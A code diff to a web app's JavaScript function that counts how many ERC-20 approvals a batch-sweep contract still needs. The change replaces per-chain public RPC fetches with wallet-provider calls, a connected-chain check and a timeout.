@@ -852,28 +852,24 @@ function render() {
 async function checkApprovalCount(evmTokens) {
     const eth = evmProvider || window.ethereum;
     if (!eth) return { needed: evmTokens.length, total: evmTokens.length };
-    const CHAIN_RPCS = { 'Arbitrum': 'https://arb1.arbitrum.io/rpc', 'Base': 'https://mainnet.base.org', 'Ethereum': 'https://eth.llamarpc.com' };
     try {
         const userAddr = (await eth.request({ method: 'eth_accounts' }))[0];
+        const chainId = await eth.request({ method: 'eth_chainId' });
+        const CHAIN_IDS = { 'Arbitrum': 42161, 'Base': 8453, 'Ethereum': 1 };
         let needed = 0;
         for (const t of evmTokens) {
             const contractAddr = BATCH_SWEEPER[t.chain];
             if (!contractAddr) { needed++; continue; }
+            // Only check tokens on the currently connected chain (eth_call goes to connected chain)
+            const expectedChainId = CHAIN_IDS[t.chain];
+            if (expectedChainId && parseInt(chainId, 16) !== expectedChainId) { needed++; continue; }
             const fromToken = t.mint || t.contractAddress;
             const rawAmount = BigInt(getRawBalance(t));
             try {
                 const allowanceData = '0xdd62ed3e' + userAddr.slice(2).padStart(64, '0') + contractAddr.slice(2).padStart(64, '0');
-                // Use chain-specific RPC to avoid MetaMask wrong-chain issues
-                const rpc = CHAIN_RPCS[t.chain];
-                let allowance;
-                if (rpc) {
-                    const r = await fetch(rpc, { method: 'POST', headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: 'eth_call', params: [{ to: fromToken, data: allowanceData }, 'latest'] }) });
-                    const d = await r.json();
-                    allowance = d.result;
-                } else {
-                    allowance = await eth.request({ method: 'eth_call', params: [{ to: fromToken, data: allowanceData }, 'latest'] });
-                }
+                const callPromise = eth.request({ method: 'eth_call', params: [{ to: fromToken, data: allowanceData }, 'latest'] });
+                const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 4000));
+                const allowance = await Promise.race([callPromise, timeoutPromise]);
                 const allowanceBig = BigInt(allowance && allowance !== '0x' ? allowance : '0x0');
                 if (allowanceBig < rawAmount) needed++;
             } catch { needed++; }
